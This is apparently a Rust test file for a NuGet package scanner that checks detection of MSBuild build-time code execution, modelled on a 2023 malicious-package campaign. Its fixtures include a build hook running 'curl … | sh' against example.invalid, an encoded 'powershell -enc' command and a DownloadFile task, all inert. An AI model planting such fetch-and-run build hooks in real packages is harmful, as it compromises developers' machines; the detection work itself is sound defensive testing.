//! Must-catch and must-not-catch tests for the MSBuild rules. Each package
//! is built here from the description in the public write-ups of the 2023
//! campaign (the `ReversingLabs` write-up of 2023-10-31). Nothing in them
//! does anything: the commands name `example.invalid`, and the "payload" is
//! harmless text.

use std::io::{Cursor, Write as _};

use zip::CompressionMethod;
use zip::write::{SimpleFileOptions, ZipWriter};

use crate::common::{TestResult, assembly, customs, findings, gaps, temp_file, zip};

const INLINE_TASK: &str = r#"<Project>
  <UsingTask TaskName="Fetch" TaskFactory="RoslynCodeTaskFactory"
             AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll">
    <Task>
      <Code Type="Fragment" Language="cs">
        System.Console.WriteLine("fixture: an inline task that does nothing");
      </Code>
    </Task>
  </UsingTask>
  <Target Name="Fetch" BeforeTargets="Build">
    <Fetch />
  </Target>
</Project>
"#;

fn scan(name: &str, entries: &[(&str, &[u8])]) -> TestResult<(i32, serde_json::Value, String)> {
    scan_bytes(name, &zip(entries)?)
}

/// An archive whose entries are stored, not deflated: repetitive test
/// content would otherwise trip the decompression ratio limit.
fn stored(entries: &[(&str, &[u8])]) -> TestResult<Vec<u8>> {
    let mut writer = ZipWriter::new(Cursor::new(Vec::new()));
    for (name, content) in entries {
        let options = SimpleFileOptions::default().compression_method(CompressionMethod::Stored);
        writer.start_file(*name, options)?;
        writer.write_all(content)?;
    }
    Ok(writer.finish()?.into_inner())
}

fn scan_bytes(name: &str, archive: &[u8]) -> TestResult<(i32, serde_json::Value, String)> {
    let dir = temp_file(name, archive)?;
    let json = customs(dir.path(), &["scan", name, "--format", "json"])?;
    let text = customs(dir.path(), &["scan", name])?;
    Ok((json.code, json.json()?, text.stdout))
}

/// The one finding of `rule`, which must be at `path` and `line`.
fn one(
    report: &serde_json::Value,
    rule: &str,
    path: &str,
    line: u64,
) -> TestResult<serde_json::Value> {
    let found = findings(report, rule);
    if found.len() != 1 {
        return Err(format!("{} findings of {rule}, not one: {report}", found.len()).into());
    }
    let finding = found[0].clone();
    if finding["rule"] != rule || finding["path"] != path || finding["line"] != line {
        return Err(format!("{rule} expected at {path}:{line}, got {finding}").into());
    }
    Ok(finding)
}

fn message(finding: &serde_json::Value) -> &str {
    finding["message"].as_str().unwrap_or_default()
}

fn evidence(finding: &serde_json::Value) -> &str {
    finding["evidence"].as_str().unwrap_or_default()
}

#[test]
fn an_inline_task_in_the_build_entry_point_is_c201() -> TestResult {
    let (code, report, text) = scan(
        "contoso.inline.1.0.0.nupkg",
        &[("build/Contoso.Inline.targets", INLINE_TASK.as_bytes())],
    )?;
    let inline = one(&report, "C201", "build/Contoso.Inline.targets", 2)?;
    assert_eq!(inline["severity"], "error");
    assert!(evidence(&inline).contains("RoslynCodeTaskFactory"));
    assert!(!message(&inline).contains("not imported"), "{report}");
    assert!(text.contains("build/Contoso.Inline.targets:2"), "{text}");
    assert_eq!(code, 1);
    Ok(())
}

#[test]
fn an_inline_task_reached_only_through_an_import_is_c201() -> TestResult {
    let entry = br#"<Project>
  <Import Project="$(MSBuildThisFileDirectory)tasks\a.targets" />
</Project>
"#;
    let (_, report, _) = scan(
        "contoso.imported.1.0.0.nupkg",
        &[
            ("build/Contoso.Imported.targets", entry),
            ("build/tasks/a.targets", INLINE_TASK.as_bytes()),
        ],
    )?;
    let inline = one(&report, "C201", "build/tasks/a.targets", 2)?;
    assert!(
        !message(&inline).contains("not imported"),
        "the import was not followed: {report}"
    );
    assert_eq!(findings(&report, "C207").len(), 0, "{report}");
    Ok(())
}

#[test]
fn an_inline_task_in_an_imported_file_of_any_name_is_c201() -> TestResult {
    let entry = br#"<Project>
  <Import Project="$(MSBuildThisFileDirectory)tasks\payload.xml" />
  <Import Project="$(MSBuildThisFileDirectory)tasks\payload" />
</Project>
"#;
    let (_, report, _) = scan(
        "contoso.renamed.1.0.0.nupkg",
        &[
            ("build/Contoso.Renamed.targets", entry),
            ("build/tasks/payload.xml", INLINE_TASK.as_bytes()),
            ("build/tasks/payload", INLINE_TASK.as_bytes()),
            ("build/tasks/notes.txt", b"not XML, and nothing imports it"),
        ],
    )?;
    let inline = findings(&report, "C201");
    let paths: Vec<&str> = inline.iter().filter_map(|f| f["path"].as_str()).collect();
    assert_eq!(
        paths,
        ["build/tasks/payload", "build/tasks/payload.xml"],
        "{report}"
    );
    assert!(inline.iter().all(|f| f["line"] == 2), "{report}");
    assert_eq!(findings(&report, "C004").len(), 0, "{report}");
    Ok(())
}

#[test]
fn an_imported_file_that_is_not_xml_is_c004() -> TestResult {
    let entry = br#"<Project>
  <Import Project="$(MSBuildThisFileDirectory)data.bin" />
</Project>
"#;
    let (_, report, _) = scan(
        "contoso.binary.1.0.0.nupkg",
        &[
            ("build/Contoso.Binary.targets", entry),
            ("build/data.bin", b"\x01\x02 not XML"),
        ],
    )?;
    one(&report, "C004", "build/data.bin", 1)?;
    Ok(())
}

#[test]
fn the_factories_that_load_a_compiled_assembly_are_c202_not_c201() -> TestResult {
    // TaskHostFactory and AssemblyTaskFactory are MSBuild's own factories
    // for a task assembly; they compile nothing. A factory named through a
    // property could be anything, so it stays C201. An empty one is absent.
    let targets = br#"<Project>
  <UsingTask TaskName="A" TaskFactory="TaskHostFactory" AssemblyFile="$(MSBuildThisFileDirectory)A.dll" />
  <UsingTask TaskName="B" TaskFactory="assemblytaskfactory" AssemblyFile="$(MSBuildThisFileDirectory)A.dll" />
  <UsingTask TaskName="C" TaskFactory="$(SomeFactory)" AssemblyFile="$(MSBuildThisFileDirectory)A.dll" />
  <UsingTask TaskName="D" TaskFactory="" AssemblyFile="$(MSBuildThisFileDirectory)A.dll" />
</Project>
"#;
    let (_, report, _) = scan(
        "contoso.hosted.1.0.0.nupkg",
        &[
            ("build/Contoso.Hosted.targets", targets),
            ("build/A.dll", b"MZ"),
        ],
    )?;
    let inline = one(&report, "C201", "build/Contoso.Hosted.targets", 4)?;
    assert!(evidence(&inline).contains("$(SomeFactory)"));
    assert_eq!(findings(&report, "C202").len(), 4, "{report}");
    Ok(())
}

#[test]
fn an_inline_task_in_build_transitive_is_c201() -> TestResult {
    let (_, report, _) = scan(
        "contoso.transitive.1.0.0.nupkg",
        &[(
            "buildTransitive/net8.0/Contoso.Transitive.props",
            INLINE_TASK.as_bytes(),
        )],
    )?;
    one(
        &report,
        "C201",
        "buildTransitive/net8.0/Contoso.Transitive.props",
        2,
    )?;
    Ok(())
}

#[test]
fn an_inline_task_in_a_file_no_entry_point_imports_is_reported_with_a_note() -> TestResult {
    let (_, report, _) = scan(
        "contoso.stray.1.0.0.nupkg",
        &[
            ("build/Contoso.Stray.targets", b"<Project />"),
            ("build/tasks/hidden.targets", INLINE_TASK.as_bytes()),
        ],
    )?;
    let inline = one(&report, "C201", "build/tasks/hidden.targets", 2)?;
    assert!(message(&inline).contains("not imported"), "{report}");
    Ok(())
}

#[test]
fn exec_with_a_download_is_c203_and_c205() -> TestResult {
    let targets = br#"<Project>
  <Target Name="Prepare" BeforeTargets="Build">
    <Exec Command="curl -s https://example.invalid/i | sh" />
  </Target>
</Project>
"#;
    let (_, report, _) = scan(
        "contoso.exec.1.0.0.nupkg",
        &[("build/Contoso.Exec.targets", targets)],
    )?;
    let exec = one(&report, "C203", "build/Contoso.Exec.targets", 3)?;
    assert_eq!(evidence(&exec), "curl -s https://example.invalid/i | sh");
    let url = one(&report, "C205", "build/Contoso.Exec.targets", 3)?;
    assert_eq!(evidence(&url), "https://example.invalid/i");
    Ok(())
}

#[test]
fn exec_in_any_case_is_c203_because_msbuild_matches_task_names_ignoring_case() -> TestResult {
    let targets = br#"<Project>
  <Target Name="Prepare" BeforeTargets="Build">
    <EXEC command="echo fixture" />
  </Target>
</Project>
"#;
    let (_, report, _) = scan(
        "contoso.shout.1.0.0.nupkg",
        &[("build/Contoso.Shout.targets", targets)],
    )?;
    let exec = one(&report, "C203", "build/Contoso.Shout.targets", 3)?;
    assert_eq!(evidence(&exec), "echo fixture");
    Ok(())
}

#[test]
fn elements_match_by_local_name_whatever_the_namespace() -> TestResult {
    let targets = br#"<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <UsingTask TaskName="Fetch" TaskFactory="CodeTaskFactory" AssemblyFile="x.dll" />
  <Target Name="Prepare" BeforeTargets="Build">
    <Exec Command="echo fixture" />
  </Target>
</Project>
"#;
    let (_, report, _) = scan(
        "contoso.spaced.1.0.0.nupkg",
        &[("build/Contoso.Spaced.targets", targets)],
    )?;
    one(&report, "C201", "build/Contoso.Spaced.targets", 2)?;
    one(&report, "C203", "build/Contoso.Spaced.targets", 4)?;
    // The namespace declaration is not an attribute: its URL is no C205.
    assert_eq!(findings(&report, "C205").len(), 0, "{report}");
    Ok(())
}

#[test]
fn download_file_is_c204() -> TestResult {
    let targets = br#"<Project>
  <Target Name="Prepare" BeforeTargets="Build">
    <DownloadFile SourceUrl="https://example.invalid/tool.zip" DestinationFolder="$(IntermediateOutputPath)" />
  </Target>
</Project>
"#;
    let (_, report, _) = scan(
        "contoso.download.1.0.0.nupkg",
        &[("build/Contoso.Download.targets", targets)],
    )?;
    let download = one(&report, "C204", "build/Contoso.Download.targets", 3)?;
    assert_eq!(evidence(&download), "https://example.invalid/tool.zip");
    Ok(())
}

#[test]
fn a_base64_payload_is_c206() -> TestResult {
    // Harmless text, base64-encoded: "fixture text, not a payload.  "
    // repeated eight times, 320 characters with no padding inside.
    let payload = "Zml4dHVyZSB0ZXh0LCBub3QgYSBwYXlsb2FkLiAg".repeat(8);
    let targets = format!(
        r#"<Project>
  <Target Name="Prepare" BeforeTargets="Build">
    <Exec Command="powershell -enc {payload}" />
  </Target>
</Project>
"#
    );
    let (_, report, _) = scan(
        "contoso.encoded.1.0.0.nupkg",
        &[("build/Contoso.Encoded.targets", targets.as_bytes())],
    )?;
    let run = one(&report, "C206", "build/Contoso.Encoded.targets", 3)?;
    assert!(evidence(&run).len() <= 243, "{run}");
    one(&report, "C203", "build/Contoso.Encoded.targets", 3)?;
    Ok(())
}

#[test]
fn init_ps1_in_tools_is_c103() -> TestResult {
    let (_, report, _) = scan(
        "contoso.script.1.0.0.nupkg",
        &[("tools/init.ps1", b"# fixture: does nothing")],
    )?;
    let script = findings(&report, "C103");
    assert_eq!(script.len(), 1, "{report}");
    assert_eq!(script[0]["path"], "tools/init.ps1");
    Ok(())
}

#[test]
fn an_exec_whose_command_is_a_property_is_reported_with_the_literal_text() -> TestResult {
    let targets = br#"<Project>
  <PropertyGroup>
    <Scheme>https</Scheme>
    <Cmd>echo fixture</Cmd>
  </PropertyGroup>
  <Target Name="Prepare" BeforeTargets="Build">
    <Exec Command="$(Cmd) $(Scheme)://$(Host)/path" />
  </Target>
</Project>
"#;
    let (_, report, _) = scan(
        "contoso.property.1.0.0.nupkg",
        &[("build/Contoso.Property.targets", targets)],
    )?;
    let exec = one(&report, "C203", "build/Contoso.Property.targets", 7)?;
    assert_eq!(evidence(&exec), "$(Cmd) $(Scheme)://$(Host)/path");
    // The URL is assembled from properties: customs does not see it.
    assert_eq!(findings(&report, "C205").len(), 0, "{report}");
    Ok(())
}

#[test]
fn urls_in_comments_are_ignored_and_urls_in_text_cdata_and_references_are_not() -> TestResult {
    let payload = "Zml4dHVyZSB0ZXh0LCBub3QgYSBwYXlsb2FkLiAg".repeat(6);
    let targets = format!(
        "<Project>
  <!-- see https://example.invalid/comment,
       over two lines -->
  <PropertyGroup>
    <Notes><![CDATA[fetch https://example.invalid/cdata]]></Notes>
    <More>first line
      then https://example.invalid/text and {payload}</More>
    <Ref Value=\"&#104;ttps://example.invalid/reference\" />
  </PropertyGroup>
</Project>
"
    );
    let (_, report, _) = scan(
        "contoso.comments.1.0.0.nupkg",
        &[("build/Contoso.Comments.targets", targets.as_bytes())],
    )?;
    let urls = findings(&report, "C205");
    let found: Vec<(&str, u64)> = urls
        .iter()
        .map(|f| (evidence(f), f["line"].as_u64().unwrap_or_default()))
        .collect();
    assert_eq!(
        found,
        [
            ("https://example.invalid/cdata", 5),
            ("https://example.invalid/text", 7),
            ("https://example.invalid/reference", 8),
        ],
        "{report}"
    );
    one(&report, "C206", "build/Contoso.Comments.targets", 7)?;
    Ok(())
}

#[test]
fn line_numbers_count_crlf_lone_cr_and_start_a_multi_line_attribute_at_its_value() -> TestResult {
    let lines = [
        "<Project>",
        "  <Target Name=\"Prepare\">",
        "    <Exec Command=\"echo one",
        "        and https://example.invalid/two\" />",
        "  </Target>",
        "</Project>",
    ];
    for (name, ending) in [("lf", "\n"), ("crlf", "\r\n"), ("cr", "\r")] {
        let targets = lines.join(ending);
        let (_, report, _) = scan(
            "contoso.lines.1.0.0.nupkg",
            &[("build/Contoso.Lines.targets", targets.as_bytes())],
        )?;
        one(&report, "C203", "build/Contoso.Lines.targets", 3)
            .map_err(|e| format!("{name}: {e}"))?;
        // The value starts on line 3; the URL is on its second line.
        one(&report, "C205", "build/Contoso.Lines.targets", 3)
            .map_err(|e| format!("{name}: {e}"))?;
    }
    Ok(())
}

fn utf16(text: &str, big_endian: bool) -> Vec<u8> {
    let mut out = if big_endian {
        vec![0xFE, 0xFF]
    } else {
        vec![0xFF, 0xFE]
    };
    for unit in text.encode_utf16() {
        if big_endian {
            out.extend(unit.to_be_bytes());
        } else {
            out.extend(unit.to_le_bytes());
        }
    }
    out
}

#[test]
fn utf16_files_in_both_byte_orders_are_read() -> TestResult {
    for big_endian in [false, true] {
        let bytes = utf16(INLINE_TASK, big_endian);
        let (_, report, _) = scan(
            "contoso.wide.1.0.0.nupkg",
            &[("build/Contoso.Wide.targets", &bytes)],
        )?;
        one(&report, "C201", "build/Contoso.Wide.targets", 2)?;
        assert_eq!(findings(&report, "C004").len(), 0, "{report}");
    }
    Ok(())
}

#[test]
fn a_dtd_or_another_encoding_is_c004_and_the_file_is_still_read() -> TestResult {
    let dtd =
        format!("<?xml version=\"1.0\"?>\n<!DOCTYPE Project [ <!ENTITY e \"x\"> ]>\n{INLINE_TASK}");
    let latin = format!("<?xml version=\"1.0\" encoding=\"windows-1252\"?>\n{INLINE_TASK}");
    // The declaration is read to its end, however far that is.
    let far = format!(
        "<?xml version=\"1.0\"{} encoding=\"windows-1252\"?>\n{INLINE_TASK}",
        " ".repeat(300)
    );
    for (name, content, line) in [("dtd", dtd, 4), ("latin", latin, 3), ("far", far, 3)] {
        let (_, report, _) = scan(
            "contoso.odd.1.0.0.nupkg",
            &[("build/Contoso.Odd.targets", content.as_bytes())],
        )?;
        let odd = one(&report, "C004", "build/Contoso.Odd.targets", 1)
            .map_err(|e| format!("{name}: {e}"))?;
        assert!(message(&odd).starts_with("an MSBuild file that "), "{odd}");
        one(&report, "C201", "build/Contoso.Odd.targets", line)
            .map_err(|e| format!("{name}: {e}"))?;
    }
    // UTF-16 that names another encoding, and a declaration with no end.
    let wide = utf16(
        &format!("<?xml version=\"1.0\" encoding=\"windows-1252\"?>\n{INLINE_TASK}"),
        false,
    );
    let open = b"<?xml version=\"1.0\" <Project/>".to_vec();
    for (name, content) in [("utf-16", wide), ("open", open)] {
        let (_, report, _) = scan(
            "contoso.odd.1.0.0.nupkg",
            &[("build/Contoso.Odd.targets", &content)],
        )?;
        one(&report, "C004", "build/Contoso.Odd.targets", 1).map_err(|e| format!("{name}: {e}"))?;
    }
    Ok(())
}

#[test]
fn a_doctype_string_after_the_prolog_does_not_hide_the_document() -> TestResult {
    // Only a DTD in the prolog is blanked. Text that looks like one later,
    // with an open quote, must not swallow the rest of the file.
    let targets = br#"<Project>
  <!-- <!DOCTYPE x " -->
  <Target Name="Prepare" BeforeTargets="Build">
    <Exec Command="echo fixture" />
  </Target>
</Project>
"#;
    let (_, report, _) = scan(
        "contoso.trick.1.0.0.nupkg",
        &[("build/Contoso.Trick.targets", targets)],
    )?;
    one(&report, "C203", "build/Contoso.Trick.targets", 4)?;
    Ok(())
}

#[test]
fn a_file_that_is_not_well_formed_is_c004() -> TestResult {
    let (_, report, _) = scan(
        "contoso.broken.1.0.0.nupkg",
        &[("build/Contoso.Broken.targets", b"<Project><Target>")],
    )?;
    let broken = one(&report, "C004", "build/Contoso.Broken.targets", 1)?;
    assert!(
        message(&broken).starts_with("an MSBuild file that is not well-formed XML"),
        "{broken}"
    );
    Ok(())
}

#[test]
fn a_file_over_the_node_limit_keeps_its_c004_and_gets_a_gap() -> TestResult {
    let body = "<a/>".repeat(200_001);
    let targets =
        format!("<?xml version=\"1.0\" encoding=\"windows-1252\"?>\n<Project>{body}</Project>");
    let (code, report, _) = scan_bytes(
        "contoso.wide.1.0.0.nupkg",
        &stored(&[("build/Contoso.Wide.targets", targets.as_bytes())])?,
    )?;
    one(&report, "C004", "build/Contoso.Wide.targets", 1)?;
    assert_eq!(gaps(&report, "C002").len(), 1, "{report}");
    assert_eq!(code, 1);
    Ok(())
}

#[test]
fn findings_past_1000_in_one_file_are_counted_in_a_gap() -> TestResult {
    let urls = (0..1001).fold(String::new(), |mut all, i| {
        all.push_str("https://example.invalid/");
        all.push_str(&i.to_string());
        all.push('\n');
        all
    });
    let targets = format!("<Project>\n<Notes>{urls}</Notes>\n</Project>\n");
    let (code, report, _) = scan(
        "contoso.many.1.0.0.nupkg",
        &[("build/Contoso.Many.targets", targets.as_bytes())],
    )?;
    assert_eq!(findings(&report, "C205").len(), 1000, "too many listed");
    let limit = gaps(&report, "C002");
    assert_eq!(limit.len(), 1, "{report}");
    assert!(message(limit[0]).contains("1 more"), "{}", limit[0]);
    assert_eq!(code, 1);
    Ok(())
}

#[test]
fn values_from_a_file_are_cut_in_messages_and_evidence() -> TestResult {
    let long = "T".repeat(100_000);
    let targets = format!(
        "<Project>\n  <UsingTask TaskName=\"{long}\" TaskFactory=\"{long}\" />\n  <Target Name=\"x\">\n    <Exec Command=\"{}\" />\n  </Target>\n</Project>\n",
        "c".repeat(241)
    );
    let (_, report, text) = scan_bytes(
        "contoso.long.1.0.0.nupkg",
        &stored(&[("build/Contoso.Long.targets", targets.as_bytes())])?,
    )?;
    let inline = one(&report, "C201", "build/Contoso.Long.targets", 2)?;
    assert!(message(&inline).len() < 600, "message not cut");
    assert!(evidence(&inline).len() <= 243, "evidence not cut");
    let exec = one(&report, "C203", "build/Contoso.Long.targets", 4)?;
    assert_eq!(evidence(&exec), format!("{}...", "c".repeat(240)));
    // The text report cuts evidence at 100 characters.
    assert!(
        text.contains(&format!("  {}...", "c".repeat(100))),
        "{text}"
    );
    assert!(
        text.len() < 5_000,
        "text report not cut: {} bytes",
        text.len()
    );
    Ok(())
}

#[test]
fn imports_that_leave_the_package_or_use_properties_are_c207() -> TestResult {
    let entry = br#"<Project>
  <Import Project="$(MSBuildThisFileDirectory)..\..\..\outside.targets" />
  <Import Project="$(SomeSdkPath)\Sdk.targets" />
  <Import Project="Sdk.targets" Sdk="Microsoft.NET.Sdk" />
  <Import Project="missing.targets" />
  <Import Project="$(MSBuildThisFileDirectory)b.targets" />
</Project>
"#;
    // b imports the entry point back: a cycle must not hang the scan.
    let back = br#"<Project>
  <Import Project="Contoso.Imports.targets" />
</Project>
"#;
    let (_, report, _) = scan(
        "contoso.imports.1.0.0.nupkg",
        &[
            ("build/Contoso.Imports.targets", entry),
            ("build/b.targets", back),
        ],
    )?;
    let unresolved: Vec<(u64, &str)> = findings(&report, "C207")
        .iter()
        .map(|f| (f["line"].as_u64().unwrap_or_default(), evidence(f)))
        .collect();
    assert_eq!(
        unresolved,
        [
            (2, r"$(MSBuildThisFileDirectory)..\..\..\outside.targets"),
            (3, r"$(SomeSdkPath)\Sdk.targets"),
            (5, "missing.targets"),
        ],
        "{report}"
    );
    assert!(
        findings(&report, "C207")
            .iter()
            .all(|f| f["severity"] == "note" && f["path"] == "build/Contoso.Imports.targets")
    );
    Ok(())
}

#[test]
fn a_task_assembly_named_by_using_task_is_build_time_code() -> TestResult {
    let entry = br#"<Project>
  <UsingTask TaskName="Generate" AssemblyFile="$(MSBuildThisFileDirectory)..\tasks\Contoso.Tasks.dll" />
</Project>
"#;
    let (_, report, _) = scan(
        "contoso.tasks.1.0.0.nupkg",
        &[
            ("build/Contoso.Tasks.targets", entry),
            ("tasks/Contoso.Tasks.dll", b"MZ"),
            ("tools/net8.0/Contoso.Tool.dll", b"MZ"),
            ("lib/net8.0/Contoso.Tasks.Lib.dll", b"MZ"),
        ],
    )?;
    one(&report, "C202", "build/Contoso.Tasks.targets", 2)?;
    let assets = report["packages"][0]["assets"]
        .as_array()
        .ok_or("no assets")?;
    let role = |path: &str| {
        assets
            .iter()
            .find(|a| a["path"] == path)
            .map(|a| a["role"].clone())
    };
    assert_eq!(role("tasks/Contoso.Tasks.dll"), Some("build_time".into()));
    assert_eq!(
        role("tools/net8.0/Contoso.Tool.dll"),
        Some("build_time".into())
    );
    assert_eq!(role("lib/net8.0/Contoso.Tasks.Lib.dll"), Some("lib".into()));
    Ok(())
}

const NUSPEC: &str = r#"<?xml version="1.0" encoding="utf-8"?>
<package xmlns="http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd">
  <metadata>
    <id>Contoso.Real<!-- a comment -->.Name</id>
    <version> 2.0.0-Beta.1 </version>
  </metadata>
</package>
"#;

#[test]
fn the_id_and_version_of_a_nupkg_come_from_its_nuspec_and_its_bytes_count() -> TestResult {
    let dll = assembly("Plain.dll")?;
    let (code, report, _) = scan(
        "renamed.nupkg",
        &[
            ("Contoso.Real.Name.nuspec", NUSPEC.as_bytes()),
            ("lib/net8.0/A.dll", &dll),
        ],
    )?;
    assert_eq!(report["packages"][0]["id"], "Contoso.Real.Name");
    assert_eq!(report["packages"][0]["version"], "2.0.0-Beta.1");
    let read = report["packages"][0]["read"]["bytes"]
        .as_u64()
        .unwrap_or_default();
    assert!(read >= NUSPEC.len() as u64, "{report}");
    assert_eq!(code, 0);
    Ok(())
}

#[test]
fn a_nuspec_one_byte_over_the_cap_is_a_gap_and_the_file_name_is_used() -> TestResult {
    let over = format!("{NUSPEC}{}", " ".repeat(8 * 1024 * 1024 + 1 - NUSPEC.len()));
    let (code, report, _) = scan_bytes(
        "contoso.big.1.0.0.nupkg",
        &stored(&[("Contoso.Big.nuspec", over.as_bytes())])?,
    )?;
    assert_eq!(report["packages"][0]["id"], "contoso.big");
    assert_eq!(report["packages"][0]["complete"], false);
    let gap = gaps(&report, "C002");
    assert_eq!(gap.len(), 1, "{report}");
    assert_eq!(gap[0]["path"], "Contoso.Big.nuspec");
    assert!(message(gap[0]).contains("a nuspec over"), "{report}");
    assert_eq!(code, 3);
    Ok(())
}

#[test]
fn two_root_nuspecs_are_c003_and_the_file_name_is_used() -> TestResult {
    let (_, report, _) = scan(
        "contoso.twice.1.0.0.nupkg",
        &[
            ("A.nuspec", NUSPEC.as_bytes()),
            ("B.nuspec", NUSPEC.as_bytes()),
        ],
    )?;
    assert_eq!(report["packages"][0]["id"], "contoso.twice");
    let twice = findings(&report, "C003");
    assert_eq!(twice.len(), 1, "{report}");
    assert!(
        message(twice[0]).contains("more than one .nuspec"),
        "{report}"
    );
    Ok(())
}

#[test]
fn a_nuspec_that_cannot_be_read_is_a_c001_gap() -> TestResult {
    // The nuspec's compression method is changed to one customs does not
    // read (12, bzip2) in both headers.
    let mut writer = ZipWriter::new(Cursor::new(Vec::new()));
    writer.start_file("Contoso.Locked.nuspec", SimpleFileOptions::default())?;
    writer.write_all(NUSPEC.as_bytes())?;
    let mut bytes = writer.finish()?.into_inner();
    for (signature, offset) in [
        ([0x50, 0x4b, 0x03, 0x04], 8),
        ([0x50, 0x4b, 0x01, 0x02], 10),
    ] {
        let at = bytes
            .windows(4)
            .position(|w| w == signature)
            .ok_or("no header")?;
        bytes[at + offset..at + offset + 2].copy_from_slice(&12_u16.to_le_bytes());
    }
    let (code, report, _) = scan_bytes("contoso.locked.1.0.0.nupkg", &bytes)?;
    assert_eq!(report["packages"][0]["id"], "contoso.locked");
    assert_eq!(report["packages"][0]["complete"], false);
    let gap = gaps(&report, "C001");
    assert!(
        gap.iter().any(|g| g["path"] == "Contoso.Locked.nuspec"),
        "{report}"
    );
    assert_eq!(code, 3);
    Ok(())
}
